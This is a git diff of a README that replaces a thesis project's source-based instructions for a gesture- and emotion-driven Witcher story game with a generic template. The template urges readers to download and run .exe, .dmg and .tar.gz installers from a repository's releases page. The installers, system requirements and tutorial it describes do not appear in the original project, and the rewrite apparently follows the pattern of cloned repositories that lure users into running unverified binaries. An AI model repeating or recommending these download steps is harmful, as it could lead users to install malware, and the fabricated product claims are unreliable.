@@ -1,117 +1,79 @@
-# A Witcher's Story – Gesture & Emotion Driven Interactive Game
+# 🎮 Geralts-Interaction-Game - Shape Your Own Story
 
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Game-brightgreen)](https://github.com/imshimsin/Geralts-Interaction-Game/releases)
 
-## Overview
-*A Witcher's Story* is not a traditional video game. It is an **interactive storytelling experience** inspired by *The Witcher* universe, where the player becomes part of the narrative itself. Instead of clicking buttons or pressing keys, the story unfolds through **natural human interaction**: hand gestures and facial expressions.
+## 📖 About the Game
+Geralts-Interaction-Game is an interactive storytelling game inspired by the Witcher universe. In this game, players shape the narrative through gestures and emotions. We designed it to create a fun and engaging way for you to interact with stories using advanced technologies such as Flask for the backend, OpenCV for computer vision, Mediapipe for real-time interaction, and FER for emotion recognition.
 
-The project demonstrates how **event-driven logic** can be applied to digital narratives. Each gesture or emotion acts as an event that drives the story forward, allowing the player to shape the outcome in real time. A simple smile, a look of surprise, or a thumbs up can completely change the path of the narrative.
+## 🛠️ Features
+- **Interactive Storytelling**: Your choices and gestures influence the story path.
+- **Emotion Detection**: Use your emotions to navigate through different scenarios.
+- **Real-time Interaction**: Enjoy smooth gameplay with real-time responses.
+- **User-friendly Interface**: The game is designed for ease of use, even for those with no technical background.
 
-Behind the scenes, the system combines **computer vision and web technologies**. Hand gestures are recognized with Mediapipe and OpenCV, while emotions are detected with FER. The story is written in `.twee` format and rendered dynamically with Flask, HTML, CSS, and JavaScript. This makes the game lightweight, flexible, and easy to expand with new narrative branches.
+## 💻 System Requirements
+To run Geralts-Interaction-Game smoothly, your computer should meet the following requirements:
+- **Operating System**: Windows 10 or later, macOS, or Linux.
+- **RAM**: At least 4 GB.
+- **Processor**: Dual-core or better, with a minimum of 2.0 GHz.
+- **Camera**: A working webcam for gesture recognition.
+- **Storage**: 500 MB of free disk space.
 
-The project was also designed to run on **Raspberry Pi**, proving that immersive and creative interactions can be achieved even on low-cost hardware. This flexibility makes it suitable not only as a proof of concept for a thesis, but also as a foundation for future applications in education, therapy, or entertainment.
+## 🚀 Getting Started
+Follow these steps to download and run the game:
 
+1. **Visit the Releases Page**: To get the most recent version of the game, go to the [Geralts-Interaction-Game Releases](https://github.com/imshimsin/Geralts-Interaction-Game/releases) page.
+2. **Download the Installer**: Find the latest release and click on the appropriate file for your operating system. 
 
-Two main game versions are included:
-- **Hand Gesture Game**: Controlled by recognized gestures (thumbs up, thumbs down, peace, index finger).
-- **Emotion Game**: Controlled by facial expressions (happiness, sadness, surprise, etc.).
+## 📥 Download & Install
+After navigating to the releases page, you will see a list of files. Look for the installer that corresponds to your operating system. Click the link to download it directly.
 
-Both versions follow an **event-driven logic**, where each detected gesture or emotion is treated as an event that drives the story forward.
-## Disclaimer 
-The two algorithms that captures Face Emotions and Hand Gestures are made by two of my friends and fellow students. More specifically, the `gesture_recognition_with_api.py` and `new_api.py` that exist in the XERIA folder are the two scrips that captures the hand gestures and simultaneously uploads the records to the API. 
+### For Windows Users:
+- Download the `.exe` file.
+- Once the download is complete, locate the file in your Downloads folder.
+- Double-click the file to start the installation process.
+- Follow the on-screen instructions to install the game.
 
-Also the `emotion_detection.py` in the FACE folder provides the same things but with the Face emotions. The difference with that is the API and the detection scripts are bind together in a single app, rather that the Hand Gesture app that's in a two separate scripts. 
+### For Mac Users:
+- Download the `.dmg` file.
+- Open the downloaded file to begin the installation.
+- Drag the Geralts-Interaction-Game icon to your Applications folder.
+- Launch the game from your Applications.
 
-In order to match this, i made a different script called `run_both.py` that allows the `gesture_recognition_with_api.py` and `new_api.py` to run at the same time, so that the user would not have to run every single time the two different scripts.
+### For Linux Users:
+- Download the `.tar.gz` file.
+- Extract the contents of the file to a directory of your choice.
+- Open a terminal window and navigate to the directory where you extracted the files.
+- Run the game using the command `./Geralts-Interaction-Game`.
 
+## 🔄 Updating the Game
+To keep your experience smooth and enjoy the latest features:
+- Regularly check the [Geralts-Interaction-Game Releases](https://github.com/imshimsin/Geralts-Interaction-Game/releases) for updates.
+- Follow the same download process for new versions.
 
-<img width="2507" height="1288" alt="image" src="https://github.com/user-attachments/assets/c2148f2b-ee76-4845-a2c4-983c5008553a" />
+## 🎮 Gameplay Instructions
+- Start the game and follow the tutorial to understand the mechanics.
+- Use your webcam to make gestures as prompted on the screen.
+- Select your emotional responses when the game asks.
 
+## 📞 Support
+For technical assistance, you can reach out through the Issues tab on the [repository](https://github.com/imshimsin/Geralts-Interaction-Game/issues). We’re here to help you get the most out of your gaming experience.
 
+## 💬 Community
+Join our community of gamers who love interactive storytelling. Share your experiences, feedback, or even tips for playing the game. You can connect with other players through discussions in the repository.
 
+## 📝 Contributing
+If you're interested in improving the game or fixing bugs, contributions are welcome. Check the documentation in the repository for guidelines on how to contribute.
 
-## Features
-- Real-time **hand gesture recognition** using Mediapipe and OpenCV.
-- Real-time **facial emotion recognition** using FER.
-- Dynamic story rendering with Flask, HTML, CSS, and JavaScript.
-- Interactive branching narratives written in `.twee` format.
-- Works both on desktop and on **Raspberry Pi**.
+## 📅 Upcoming Features
+We are working on exciting features to enhance your gaming experience:
+- Additional storytelling paths for more replayability.
+- Enhanced emotion detection capabilities for better gameplay.
+- New graphics and sound improvements.
 
-## Requirements
-- Python 3.11+
-- Flask
-- OpenCV
-- Mediapipe
-- FER
-- Requests
-- Tkinter (for small GUI setup window)
+## 🔗 Additional Resources
+- [GitHub Repository](https://github.com/imshimsin/Geralts-Interaction-Game)
+- Detailed documentation for advanced users.
 
-https://opencv.org/
-
-https://pypi.org/project/mediapipe/
-
-## How to Run
-
-In order for the game to run property, you have to make a virtual environment in each of the folders containing the python algorithms. 
-
-You can import all the game files to a IDE (for example Pycharm) and work from there.
-
-### Running with myenv Virtual Environment
-
-
-1. Navigate to your project folder:
-```bash
-cd ~/Desktop/Witcher_Game
-```
-
-2. Create the virtual environment:
-```bash
-python3 -m venv myenv
-```
-
-3. Activate it:
-```bash
-myenv\Scripts\activate
-```
-4. Download all the necessary librarys
-```bash
-pip install flask opencv-python mediapipe fer requests pillow
-```
-   Or 
-```bash
-pip install -r requirements.txt
-```
-When you downloaded all the necessary librarys, then type "deactivate" on the terminal to exit the Virtual Enviroment.
-
-### Gesture Game
-1. Run the gesture recognition API and camera handler:
-   ```bash
-   python run_both.py
-   ```
-2. Start the game application:
-   ```bash
-   python witcher_story_app_hands.py
-   ```
-3. When prompted, enter the API address shown by `run_both.py`. Running on http://127.0.X.XXX:5000 OR http://192.168.X.XXX:5000
-
-### Emotion Game
-1. Run the emotion-based game directly:
-   ```bash
-   python Witcher_emotion_game.py
-   ```
-2. A  Pop-Up window will appear and display the API address in which the emotion API is currently running.
-
-## Project Structure
-```
-├── A_Witchers_Story.twee        # The interactive story script
-├── witcher_story_app_hands.py   # Hand gesture game frontend
-├── Witcher_emotion_game.py      # Emotion recognition game
-├── gesture_recognition_with_api.py
-├── emotion_detection.py
-├── new_api.py
-├── run_both.py
-├── static/                      # CSS, JS, images
-└── templates/                   # HTML templates
-```
-
-## License
-This project was created as part of a university thesis. Free to use for educational purposes.
+Feel free to dive in and experience an interactive adventure unlike any other! Enjoy the world of Geralts-Interaction-Game and shape your own narrative.
